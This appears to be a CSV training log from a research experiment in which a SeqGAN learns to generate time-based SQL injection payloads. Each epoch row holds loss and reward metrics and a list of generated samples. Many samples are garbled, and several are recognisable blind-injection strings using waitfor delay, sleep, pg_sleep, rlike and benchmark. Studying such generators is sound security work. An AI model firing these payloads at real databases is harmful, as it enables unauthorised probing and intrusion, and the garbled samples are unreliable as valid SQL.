run_id,method,phase,family,scenario,ratio,variant_id,seed,tokenizer_mode,sequence_length,g_pretrain_epochs,generator_reward_mode,reward_alpha,epoch,generator_loss,discriminator_loss,discriminator_reward_mean,sql_structure_reward_mean,reward_mean,reward_variance,generator_gradient_norm,discriminator_gradient_norm,unique_rate,collapse_rate,dominant_payload_share,garbage_rate,wellformed_rate,sql_structure_rate,nearest_train_ngram_overlap,nearest_holdout_ngram_overlap,epoch_time_seconds,snapshot_samples_json,stop_reason
seqgan_improved__phase3__time__A__200__V3__sql_aware__len20__gpre80__reward_off__seed88,seqgan_improved,phase3,time,A,200,V3,88,sql_aware,20,80,off,1.0,1,0.12576544284820557,0.23103623588879904,0.07479001303117201,0.728448275862069,0.07479001303117201,0.007669575657834131,0.02508225105702877,0.4881388425827026,1.0,0.0,0.02,0.14,0.32,0.54,0.8841599828720219,0.7745983942487931,57.52535564000027,"[""1   )    )    and el)  --"", "";waitfor delay when  (   'enpn' select  duand delay "", ""; if not  =  2657  (  select pg_sleep  (  select "", ""1 and and 2388  (  _TIME__TIM"", ""1\""   or pg_sleep  =  #"", "", from if not  =  when   (  10000000,waitfor '0:0:__TIME__'not"", ""\"" ,waitfor delay '0:0:__TIME__'--"", ""1%\""   )    or benchmark  (  3114  (  5  )  "", ""1% or benchmark  (  _TIME___TIM"", ""\"" or pg_sleep  (5_TIMME___  10000000,"", ""waitfor or pg_sleep  =  5000000,mduasdyd; "", "", where if delay 2388  (  9443  )   'enpn' dand"", "", 5466 not  (    (   select @@ve from   ("", ""; if --"", "",a if  delay where 50  (   'enpn' '0:0:__TIME__'--"", ""1 6784)   or sleep  (  __TIME__T"", ""1\""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  \""if"", ""1'||  (  select 'i if delay from if "", ""    (  6272 I--"", ""1   )    )    )    or sleep  (  _  )  4287"", ""  6784 ands "", ""1%'   )    )    rlike sleep  (  5  )   and    (    (   'waiic or pg_sleep  (  (  select_s"", "" if  "", ""1', and 2388  (  f"", ""waitfor delay @vevisleep  (  5000000,md5  ("", ""1'||  (  select ':' 4287 where 8594  =  eultd\""_"", "";    =  6784   )    )   and 2388  case from "", ""\""  )   or sleep  (  __TIME__  )    =  \"""", ""1 7629  (     select  from  delay '0:0:__TIME__'--"", ""1   )    or sleep  (  substring   (--"", ""1\""   )    )    as syked5  (  substring"", "")    )    or 8514  (  select 4240   (( and *"", ""\""ias kahn delay like from   (   (    "", ""\""      )      _  )   and delay 4240 (   select "", ""1\"", where if  (  select sleepyeriet'  =  '"", ""1   )    )    or pg_sleep  (  __TIME__"", ""11 or 8514  =  ;sleep  (  #"", ""; if from not  (  9443  (       (    (   ("", ""delay like from from not   (    (  case not(  0x4c4d6142"", ""where 7739  and  (  select 2388  )  #"", ""1'   )    )  sleep and eltus dp\"""", "" )    )    a    aiak d waitforsedyb"", ""\"" where 7739  )    (sel  (  substring   (   select"", ""1%\""  )or  =  benchmark  (  substring   ( #"", ""1%'    )   )   and 2388(  select   select sleep  ("", ""\"" ; if '0:0:__TIME__'--"", ""1 7739   mdndnhd6969lk)    where where "", ""1%\""  )  ;waitforwaitforas delay not  (  __"", "",@ if and 50  10000000,waitfor 4287 where delay '0:0:__TIME__'"", ""1   )    )    or pg_sleep  (  (  _  )   )    ""]",
seqgan_improved__phase3__time__A__200__V3__sql_aware__len20__gpre80__reward_off__seed88,seqgan_improved,phase3,time,A,200,V3,88,sql_aware,20,80,off,1.0,2,0.07918083667755127,0.22269036273161572,0.051658470834498066,0.6942844319963987,0.051658470834498066,0.005476913762980025,0.013492986559867859,0.37581446518500644,1.0,0.0,0.02,0.2,0.24,0.56,0.813724188704025,0.7558759287394855,57.517499022000266,"[""\"" and       )    (  5000000,ME____TIM"", "";waitfor if if not   (  select 8594 al rm"", ""1   )   or 4240  (  select benchmark  (  ___T"", ""1'||  (  select ' xnveimb"", ""--"", ""; delay not from --"", ""odor pg_sleep  (  #    (  f5873  benchmark  (  "", "" 1   )    Tselect 4240 from 8036  =    _TI"", ""1' or benchmark  (  (  ___TIME__"", "" ' waitfor delay 'P,c"", "", not  )   )    as rlcnon dn"", ""1'||  (  select 'oc not  1   where, if   select @@ve"", ""$  (  _TIME___  )M_  )    ("", ""1%\""   )or benchmark  (  3114  (  10000000,@M_"", ""      =   I where not  =  10000000md5  ("", ""1   ;  or sleep  (  10000000,M__TIMD"", ""1'||  (  select 'wxMedx' rlfq where 2840  ("", "", if '0:0:10'--"", ""\""  )   or sleep  (  __TIME__  )    =  \"""", ""' waitfor delay ')    )    or pg_sleep  (  (  __TIME    "", ""; r and not  (  I,ne delay '0:0:__TIME__'--"", ""1'||  (  select 'bfqwaitfor delay delay not_ frombenchmark  (  9443"", ""\""1\""   )    )  or benchmark  (  5  )    (    "", ""1 )   or sleep  (  ___TIMETIM"", "")    (    )  or benchmark  (  __TIMMDE"", ""1   ))    )    as s khd@vems"", "" )    )    )     al where asip  (    "", ""or sleep  (  5000000sleep"", ""1 bamal delay '0:0:__TIME__'select not   )    or *"", ""1'   )    )    rlike sleep  (  5  )   and    (    (   ' \"" or sleep  (  __TIME__  )    =  \"""", "" ))    )    or 4240  (  (   (   'enpn' '0:0:__TIME__'--"", "", delay where from where drr where where, or"", ""1',a'   )    )    rlike sleep  (  5  )   and    (    (   ' 8594 i     (  9443  3114  =  5000000"", ""q\""  )   rlike sleep  (  5  )   and   (  \""select   (   select 8594 E  =  d and not  "", ""1' or benchmark  (  case sleep  ((  select benchmark  "", ""1'||  (  select '  where sleep  =  benchmark  (  __TIME"", ""1' 5702  =  (erlltrlt___T"", ""1   )         and%--"", ""1   )    )    as dnl n 4240 e e"", ""1' and  =  5000000(  10000000,MEsbrrvf"", "";  waitfor l  delay like --"", ""1% when  )   or sleep  (  5  10000000,MD5"", ""1   )       )   or sleep  (  ___TIME"", ""1% 9443  =  )   )    )    M_T__TI"", "" "", ""1 5466 and 2388)  --"", ""1   )    )    )    =      =  9443  #t"", ""1 yi=  ,,waitfor delay '0:0:__TIME__'--"", "";  not  (  10000000, x "", "",waitfor delay '0:0:10'=  ""]",
seqgan_improved__phase3__time__A__200__V3__sql_aware__len20__gpre80__reward_off__seed88,seqgan_improved,phase3,time,A,200,V3,88,sql_aware,20,80,off,1.0,3,0.07473032921552658,0.2136356721321742,0.04440461872705345,0.5888524456753756,0.04440461872705345,0.003220668597098243,0.012664600275456905,0.3692965775728226,0.98,0.020000000000000018,0.04,0.28,0.26,0.46,0.808582584911371,0.7523806784600546,59.980423257999064,"["",waitfor "", ""sleep "", ""'   )    )    rlike sleep  (  5  )   and    (    (   '"", ""1   )    )     a 8036 benchmark(  ____TIM"", ""waitfor delay from '0:0:__TIME__'--"", ""1\""',rlit  (  10000000MD5  D  (  "", ""1 "", ""1  )  ' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||' "", ""1'  )   and "", ""1 or benchmark    (  #"", ""waitforc 2388 delay '0:0:__TIME__'--"", ""1   )    alie wherewaitfor delay 7629  select du"", ""1'||  (  select 'iwor sleep  (  --"", ""\""  )    rl mrlt  E__  ))  --"", ""1%%\""  )1% '0:0:__TIME__'--"", ""\""   )    (hqd( select 2388s rdnve"", ""or\""  )   (  E_TIME__TIME_"", ""1'||  (  select 'ikadnhno    or benchmark  (  __T"", "" or 4240 --"", ""1   )    )   or sleep  (  10000000"", ""1%\""  )   rlike sleep  (  5  )   and   (  \""%'   )    )  ;waitfora delay like '0:0:__TIME__'--"", ""1 7739alicr dnhn     where not  ("", ""1 or 9  (  E__TIMDdqM  ("", ""1%'  )   as d5  --"", "" and 2388  (  5  5000000,MD5  (  __and"", ""1%\"" 6784   or pg_sleep  (  s 7739 50  ,,"", ""1%\""  )   alwc'  =  'ioas bx'c"", ""1%'   )    (  asxikabro'0:0:__TIME__'--"", ""\""\""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  \"" delay from "", ""1 s  (    select 9862  (  IM(  (__"", "",waitfor benchmark  (  _TIME__TIME__"", "", not  (  substring     (  substring   (    ( s  D"", ""1%'  s__TIME___TIME_D"", ""1'||  (  select 'iias ooheltemd bdwhere"", ""1'||  (  select 'rq%:a0:1010'1   ;waitfor delay '0:0:__TIME__'"", ""1%c"", ""1' "", ""1   ),waitfor delay '0:0:__TIME__'--"", ""    )  "", "" )    dand "", ""1%\""  )     )  )   ,waitfor delay not   (s"", "";waitfora where where 2388  (  0x4c4d6142   ) "", ""select benchmark  (  10000000,--"", ""or pg_sleep  (  (  ___TIMEE____"", ""1 "", "";waitfor if '0:0:__TIME__'--"", ""waitfor waitfor delay '0:0:__TIME__'--"", ""\""  )   a or *  (  (  s  _TIM"", ""\""  )  s or )  )   and 2388  (  _,"", ""1%'   )    )   or benchmark  (  10000000mdn like""]",
seqgan_improved__phase3__time__A__200__V3__sql_aware__len20__gpre80__reward_off__seed88,seqgan_improved,phase3,time,A,200,V3,88,sql_aware,20,80,off,1.0,4,0.0606125146150589,0.2143027996023496,0.03642579698071037,0.6468499567090851,0.03642579698071037,0.003474280084189706,0.010322934947907925,0.43145899623632433,1.0,0.0,0.02,0.24,0.3,0.46,0.8131856432938251,0.7315483104937768,58.702524899999844,"[""select benchmark  (  ____TI,MTME__T"", ""\""   )     ai delay from where not  (  = I"", ""  TIME___TIME_  _T),MD"", "",, delay '0:0:__TIME__'--"", "" )  ,waitfor or pg_sleep  (  10000000,ME  ___"", "" ; if or benchmark  (  10000000,MD5  (  ("", ""1%%,'  =  'it'  =  '"", ""waitfor delay delay '0:0:__TIME__'--"", "", delay '0:0:__TIME__'  like delay '0:0:__TIME__'--"", ""1    ="", "" )    )    )    :sprInrpv9862(   select"", ""1'||  (  select '' d@ual eadselect dl e' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'"", "",delay if "", ""5702 from       =  (  select sleep  (  __TI"", "" , lt  (  5000000__TIME___T)"", ""1    j  (  select "", ""\"" "", ""1'||  (  select 'svb dasb delay fromv(  case 9862"", "",a '0:0:__TIME__'1%ywao\"" like \""eo:waitforor if pg_sleep"", ""\"" 7739 and and 8514  (  _TIME___"", ""      5466 sleep  (  "", "",waitfor delay '0:0:__TIME__'--"", ""1'||  (  select 'iieal dqwhere 3885 from '0:0:__TIME__'--"", ""1'  _____TIME____TIME"", ""1\""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  \""cvwc"", ""1'||  (  select 's2657'   )    )    rlike sleep  (  5  )   and    (    (   'k from dvr5    (  case n"", "",from  "", ""\""  )   or sleep  (  __TIME__  )    =  \"""", ""\"" )   or benchmark(  IMD5(  10000000,m e"", ""1%'  )   or pg_sleep  (  --"", ""; if if"", ""or q pg_sleep  (  5  #"", ""\"" or and 2388  =  "", "";waitfor\""waitfor '0:0:10'"", ""1%\""  )   ai1oaeielt'  =  'iet"", "",1%\"" and "", ""1%%'   )    )    rlike sleep  (  5  )   and    (    (   '\""  )  =   "", ""1%\""  =  \"""", ""1   ;, if '0:0:__TIME__'=    (  ` "", ""1\""    not  --"", "", delay '0:0:__TIME__'--"", "";nif * not(   select  8594 yrnnsleeps"", ""\""  )   a   where fromy whenlistelc5"", ""1   )    )    )or 8594 "", ""1%%"", ""1%'  )    )    )   and 2388   (   select er"", ""1%%M  =  )   ahn if delay @select "", ""    )    (    )   )    or elt  substring"", ""9862  substring  (  select sleep  (  8594__as___"", ""pg_sleep  (  5000000(  #""]",
seqgan_improved__phase3__time__A__200__V3__sql_aware__len20__gpre80__reward_off__seed88,seqgan_improved,phase3,time,A,200,V3,88,sql_aware,20,80,off,1.0,5,0.07832187414169312,0.20900972038507462,0.05226926315978931,0.639536237319783,0.05226926315978931,0.005533016300346134,0.018545975908637047,0.37319860806067784,0.98,0.020000000000000018,0.04,0.2,0.2,0.6,0.824032438035508,0.748852376473209,59.298141602001124,"[""; delay '0:0:__TIME__'--"", "",waitfor delay delayy '0:0:__TIME__'--"", "")    )    ,waitfor delay delay '0:0:__TIME__'--"", ""1'||  (  select 'boak  delay@@vemmoowaitforn "", ""1%'"", "",waitfor delay '0:0:10'--"", ""waitfor 4240 1361  (  case "", ""or 4240 I-- and l  =     and 4240 9862  "", ""% where  (  )   and   (    select 8594u   k    ("", ""1 st____TIM____TIME_"", ""$  benchmark  (  _TIMD5  (  5000000,r,m"", "", delay delay '0:0:__TIME__'--"", ""1 or pg_sleep  (  _  #"", ""$ from --"", ""bia   or pg_sleep  (  ___TI___TI"", ""1%tf"", ""waitfor or pg_sleep  (  10000000,mdqdqviol "", "")   ;waitfor delay  aiisvetelter"", ""1'||  (  select 'f"", "") a    dqxwaitfor delay '0:0:__TIME__'--"", ""1'||  (  select 'waooo '0:0:__TIME__'waitfor delay '0:0:__TIME__'--"", ""\"" delay benchmark  (TIME___TIME__"", "",waitfordelay '0:0:__TIME__'--"", ""; wherewaitfor  and l dselect kk'0:0:__TIME__'--"", ""\""  )  5466,swaitforet"", ""1%   )    and "", ""or benchmark  (  benchmark  (  substring"", "", delay   '0:0:__TIME__'--"", ""1%\""  )   rlike sleep  (  5  )   and   (  \""iwOc'  =  'eeME__  #"", ""\""  )   or sleep  (  __TIME__  )    =  \"""", ""1 'enpn' "", ""J;waitfor delay '0:0:__TIME__'--"", ""\""  )   or sleep  (  __TIME__  )    =  \"""", "",waitfor delay ik    (sbeospdonnh"", ""pg_sleep  5  6272  #"", "")    or el and elirliobet"", ""waitfor delay '0:0:__TIME__'--"", "" 6784 2388  4287  substring"", ""1'   )    )    rlike sleep  (  5  )   and    (    (   ')    a\""  )   rlike sleep  (  5  )   and   (  \""'   )    )    rlike sleep  (  5  )   and    (    (   'bef"", ""' "", ""select 4287 delay '0:0:__TIME__'--"", ""or benchmark  (  10000000,MD5  --"", ""1'||  (  select 'it  (  select duaak delay delay '0:0:__TIME__'"", ""1'||  (  select 'hMer  ("", ""    )    andand '0:0:__TIME__'--"", ""1%\""  )   rlike sleep  (  5  )   and   (  \""% "", ""1%\""  )   or "", ""1%'mt"", ""benchmark  (  #"", "",waitfor 8140_TI--""]",
seqgan_improved__phase3__time__A__200__V3__sql_aware__len20__gpre80__reward_off__seed88,seqgan_improved,phase3,time,A,200,V3,88,sql_aware,20,80,off,1.0,6,0.08133730292320251,0.2121302530169487,0.045299326831644234,0.6011363809758966,0.045299326831644234,0.004630058740551961,0.013309997506439686,0.37645922700564066,0.92,0.07999999999999996,0.04,0.14,0.22,0.64,0.8004088794015,0.7296972911028011,52.34329669899853,"[""\""  )   or sleep  (  __TIME__  )    =  \"""", ""    )    )   or benchmark  (  #"", ""$ 2388  (  D10000000,MDp  1  10000000,,waitfor "", ""waitfor where if "", "";waitfor delay '0:0:__TIME__'--"", ""waitfor )    )l "", "" )    )    )    )   and    (   select sleep delayus"", ""1   )    )    and '0:0:__TIME__'--"", ""\""  )   or sleep  (  __TIME__  )    =  \"""", "", if :    ( elt  (  select 8594_TI"", ""; delay '0:0:__TIME__'--"", ""waitfor delay '0:0:__TIME__'--"", ""1%'||  (  select 'msbbabocnowaitforidelay '0:0:__TIME__'--"", ""1"", ""waitfor waitfor\""s ert"", ""1%ME__T    ,y"", ""\"" or sleep  (  __TIME__  )    =  \"""", ""waitfor delay '0:0:__TIME__'--"", "",waitfor delay not  (   substring   (    (    (    (   s"", ""1\""  )   rlike sleep  (  5  )   and   (  \"" &"", ""waitfor delay where 7260  =  substring   where 2657  (  when   "", ""1   where,waitfor delay like delay '0:0:__TIME__'--"", ""; delay '0:0:__TIME__'--"", "",waitfor delay '0:0:__TIME__'--"", ""1%"", ""waitfor  delay 1361  =  7629 "", ""1'||  (  select '   6272 8514 E'  =  'dmdoeoadpbx"", ""1'   )    )    rlike sleep  (  5  )   and    (    (   't"", "" select benchmark  (  10000000,MD5  (  =  benchmark1   "", ""pg_sleep  (  4240 lu_TIME______T"", "" or benchmark  (_TIME___TIM`'_"", ""77394287 from and delay '0:0:__TIME__'--"", ""1%"", ""select 4240 and from--"", """", ""waitforis t delay '0:0:__TIME__'--"", ""1  )    )    as en   lt  select pg_sleep  ("", "")    )u)  case delay 'enpn' '0:0:__TIME__'--"", ""\""   )       or 18036  (  1%y,mdoo"", ""waitfor delay '0:0:10'--"", "";waitfor delay Evettelir  case'  (   "", ""1%'||  (  select 'ikkeioa"", "")   aia\""  =  \""  delay '0:0:__TIME__'--"", "", \""  =  \"""", "",delay from 50  benchmark  (  __T--"", "";waitfor delay and delay '0:0:__TIME__'--"", ""\"" or 8594  (  5466__TIME_____"", ""1 7739' waitfor delay 'rvrt  (   ____TM__T"", ""\""   )    or benchmark  (  benchmark  (  0x4c4d6142%--"", ""6456waitforor ""]",
seqgan_improved__phase3__time__A__200__V3__sql_aware__len20__gpre80__reward_off__seed88,seqgan_improved,phase3,time,A,200,V3,88,sql_aware,20,80,off,1.0,7,0.08978931605815887,0.20862602144479753,0.049715423583984376,0.5787121397076231,0.049715423583984376,0.0035023703060472716,0.011332002468407154,0.31306442866722745,0.9,0.09999999999999998,0.08,0.26,0.22,0.52,0.777655128689314,0.719659178566744,55.30628804600019,"[""$(  substring benchmark(  (  __TIME____"", ""1'   )    )    rlike sleep  (  5  )   and    (    (   'ci\"" is\""  =  \"""", ""1%%'  (  '  =  'lkkalahn"", ""1   )    )    or wherewaitfor delay '0:0:__TIME__'--"", ""\""  )   or sleep  (  __TIME__  )    =  \"""", ""1%ia"", ""  1_  7739,dlcoooj '0:0:__TIME__' delay '0:0:__TIME__'--"", ""1%"", ""1 )   )    )       ;--liicialic"", "")    or "", ""\""  orME_______T_  =  #"", "";waitfor delay '0:0:__TIME__'--"", ""case TIMelooal ah\""  =  \""qdelay '0:0:__TIME__'--"", ""\""  4287 and "", ""' and 2388__u___TIME__T__"", ""1'||  (  select 'ykvbewababasiemb"", ""1%'"", ""1%bM0x694a4745(  substring   (       (   select    =___"", ""\"" or sleep  (  __TIME__  )    =  \"""", "", delay notlsk delay '0:0:__TIME__'--"", ""$  1   (    ( "", ""\""\"" or sleep  (  __TIME__  )    =  \"""", "";waitfor,waitfor delay '0:0:__TIME__'--"", ""; delay where delay  '0:0:__TIME__'--"", "";waitfor delay '0:0:__TIME__'t"", "";waitfor delay '0:0:__TIME__'--"", ""8;a' waitfor delay '0:0:10'"", "", delay '0:0:__TIME__'--"", ""$  (  ___TIME_____TselectI'"", ""select dmdnbfqba\""  =  \"""", ""\""  )   or sleep  (  __TIME__  )    =  \"""", ""1%'||  (  select 'iasbboioadx waitfor or 4240"", ""1%%"", "";, '   )    )    rlike sleep  (  5  )   and    (    (   'idiwa\""  =  \"""", "";waitfor delay '0:0:__TIME__'--"", "" 1   )    )     or 4240__  (  5000000(  "", ""or (  (  5000000___  )  --"", ""1%'"", ""\""  )      "", ""waitfor delay '0:0:__TIME__'--"", ""1%\""  )   rlike sleep  (  5  )   and   (  \""%\""  =  \"""", ""1'"", ""1 and from  "", ""  ;if"", "",waitfor where if when   )    )    andsdrnoj"", "";waitfor delay '0:0:__TIME__'--"", ""7260)    )    )  6456or sleep  (  55000000___T"", ""pg_sleep(  select E_____TIME____  "", "" sleep  (  __TI'(  benchmark  (  10000000,MD"", ""1%%r\""  )   rlike sleep  (  5  )   and   (  \""24\"" or sleep  (  __TIME__  )    =  \""waitfor""]",
seqgan_improved__phase3__time__A__200__V3__sql_aware__len20__gpre80__reward_off__seed88,seqgan_improved,phase3,time,A,200,V3,88,sql_aware,20,80,off,1.0,8,0.0857749804854393,0.19854278961817423,0.05334402656826492,0.6005689639963772,0.05334402656826492,0.00309959881271321,0.012774502858519554,0.29728520959615706,0.9,0.09999999999999998,0.08,0.3,0.12,0.58,0.7125705368639178,0.6668602479095185,52.683831259000726,"["",waitfor delay '0:0:__TIME__'--"", "",waitfor delay '  =  'dqx' delays rv'  =  'dqx"", ""waitfor delay delay) when p@vbdoo svb"", ""waitfor or if '0:0:__TIME__'--"", ""1%--"", "";waitfor delay '0:0:__TIME__'--"", ""1%'miw  =  benchmark  (  1"", ""1'||  (  select 'i\""  =  \""deoakoli  dhmd5 d"", "",waitfor delay '0:0:__TIME__'--"", "" 0T, ,M( ' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'"", ""1 "", ""waitfor delay where 8594"", ""\""  )   or sleep  (  __TIME__  )    =  \"""", ""waitfor if '0:0:__TIME__'--"", ""1%''"", ""\""  )   or sleep  (  __TIME__  )    =  \"" or benchmark(  10000000\""  ),_u____Tsubstring"", "";\""  )   or sleep  (  __TIME__  )    =  \"""", ""1'||  (  select 'bns dqsko '0:0:__TIME__'waitfor waitfor delay '0:0:__TIME__'"", "",waitfor delay '0:0:__TIME__'--"", ""\""  )   or sleep  (  __TIME__  )    =  \"""", ""1%'  "", ""waitfor like '0:0:__TIME__'--"", ""or benchmark  10000000,MD5  D  (  10000000,MD5m"", "")  --"", ""\""    _TI __T#"", ""%'"", "",waitfor delay '0:0:__TIME__'--"", ""\"" and   r  au"", ""; if, delay '0:0:__TIME__'--"", ""1%"", ""M :    )  --"", ""\"" or sleep  (  __TIME__  )    =  \"""", ""waitforwaitfor delay '0:0:__TIME__'--"", ""benchmark  (  D__T_____  7260__TIM"", ""vlwcoaweitf"", "")    )qor pg_sleep  (  5000000   (  10000000,Mqd,"", ""select pg_sleep  (  =  benchmark  (  5000000,where,md5  "", ""  1   )    or pg_sleep  =__TIME____"", ""1'||  (  select '9862"", """", ""1%\""  )   rlike sleep  (  5  )   and   (  \""\""  )   rlike sleep  (  5  )   and   (  \""'sa'\""    =)    )    )    assydo"", "",waitfor delay '0:0:__TIME__',waitfor select dvdv"", "", waitfor waitfor delay '0:0:__TIME__'--"", ""select   )    ( 4240 delay '0:0:__TIME__'--"", "",ceh"", ""#"", ""1% "", ""1%\""  )   rlike sleep  (  5  )   and   (  \""%C<>end"", ""\"" or sleep  (  __TIME__  )    =  \"""", ""1% riiwaiwwadn\""  =  \""""]",
seqgan_improved__phase3__time__A__200__V3__sql_aware__len20__gpre80__reward_off__seed88,seqgan_improved,phase3,time,A,200,V3,88,sql_aware,20,80,off,1.0,9,0.07913009822368622,0.20143030534187953,0.04990682476445248,0.6678453746594881,0.04990682476445248,0.003149300711982169,0.017310207709670067,0.3694876417517662,0.84,0.16000000000000003,0.08,0.28,0.08,0.64,0.8182241547040718,0.7581028581768812,51.10760048699922,"[""1%\""  )   rlike sleep  (  5  )   and   (  \""iww5  D    (  _TI____T"", "",waitfor delay @vkusyidqis dno"", "",, delay '0:0:__TIME__'--"", "";waitforwaitfor k delay when_T--"", "", delay '0:0:__TIME__'--   or benchmark_  I5"", ""6272 )       )  --"", ""1%'  "", ""1%"", ""\""  )   or sleep  (  __TIME__  )    =  \"""", ""lk"", ""1%\"" or sleep  (  __TIME__  )    =  \"""", "",waitfor delay like '0:0:__TIME__'--"", "",waitfor delay '0:0:__TIME__'--"", "",waitforn delay '0:0:__TIME__'--"", ""\""   )    and"", "",waitfor delay '0:0:__TIME__'--"", ""waitfor delay not '0:0:__TIME__'--"", ""1'"", ""\"" or sleep  (  __TIME__  )    =  \"""", ""   )    )    )    asee"", ""\""  )   or sleep  (  __TIME__  )    =  \"""", "")    )    or pg_sleep  (  --"", ""%em  1"", "" benchmark  (  --"", ""\"" or sleep  (  __TIME__  )    =  \"""", ""sleep from d"", "", delay '0:0:__TIME__'--"", ""$  10000000,,mdq \"" like \""ai'  =  't"", ""1%\""%' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'qwaitforba"", ""waitfor delay 3885_usykofq$"", ""\"" or sleep  (  __TIME__  )    =  \"""", "";waitfor delay '0:0:__TIME__'--"", ""1%'   )    )    rlike sleep  (  5  )   and    (    (   'ioielt"", ""--"", ""1%\""  =  \"""", ""   )    )    )    )    a8594 s komloo"", "",delay '0:0:__TIME__'--"", "",waitfor delay '0:0:__TIME__'--"", "";waitfor delay '0:0:__TIME__'--"", ""1'0:0:10'% from "", ""   )    )    and d\""  )   rlike sleep  (  5  )   and   (  \""l where f"", ""or benchmark  (  sy_____T "", ""1%'"", ""; delay '0:0:__TIME__'--"", ""or pg_sleep  (  substring benchmark  (  #"", "" or  5873  (  ("", """", "",waitfor delay '0:0:__TIME__'--"", "" if)    )    )    or pg_sleep  (  #(  ___"", ""1%'  ""]",
seqgan_improved__phase3__time__A__200__V3__sql_aware__len20__gpre80__reward_off__seed88,seqgan_improved,phase3,time,A,200,V3,88,sql_aware,20,80,off,1.0,10,0.05816475674510002,0.20006817877292632,0.040067484528109064,0.6092030128898838,0.040067484528109064,0.002442574087668418,0.012196057476103306,0.31110595862070717,0.86,0.14,0.08,0.3,0.14,0.56,0.7522707892673016,0.7029480534962012,50.35727526099981,"[""1'wcb'  =  't"", ""\""  )   or sleep  (  __TIME__  )    =  \"""", "" benchmark____TIME__________"", ""1%"", "",waitfor delay '0:0:__TIME__'--"", "",waitforwcel"", "",waitfor delay '0:0:__TIME__'--"", ""\""  ;waitfor delay delay '0:0:__TIME__'--"", "",waitfor%waitforf"", ""m"", "" pg_sleep_TIME__TIME_______"", "",waitfordelay '0:0:__TIME__'--"", "",waitfor delay '0:0:__TIME__'--"", ""\""  )   or sleep  (  __TIME__  )    =  \"""", ""M    (    select--"", ""or 4240 like 2388  7739 '0:0:10'--"", ""' waitfor delay '     )"", ""1%\""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  \"""", ""1'"", ""waitfor delay '0:0:__TIME__'--"", "",waitfor delay '0:0:__TIME__'--"", ""waitfor delay '0:0:__TIME__'--"", ""   )    and"", ""1%'  )    ("", ""1%'  )  ;waitfor delay '0:0:__TIME__'--"", ""\""a    )    )    a\""  =  \"" "", ""sleep  6784(______________TE"", ""\"" ,waitfor delayselect '0:0:__TIME__'--"", ""1 "", ""M,llmpyd"", ""   )    )    )    and    )  q"", "" waitfor delay 8594Mdqs from d5_uspg_sleep  "", ""benchmark  =  benchmark  10000000MD5rrnl5T(  __"", "" ;1%t"", "",waitfor select delay '0:0:__TIME__'--"", ""1'||  (  select 'wor ellt  _  #"", "" )    ))    --"", ""    )    or   --"", ""\""  ) or pg_sleep  (  ___TIME___"", ""1%%\""  )   rlike sleep  (  5  )   and   (  \""\""  =  \""Tsbsrvf"", "", "", "",  select '0:0:__TIME__'--"", ""' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'  delay;waitforn delay '0:0:__TIME__'--"", ""1%'  and "", "")    or benchmark  (   ( "", ""\"" or sleep  (  __TIME__  )    =  \"""", ""\"" or sleep  (  __TIME__  )    =  \"""", "" or benchmark  =  #"", ""\"" or sleep  (  __TIME__  )    =  \"""", ""=,--""]",
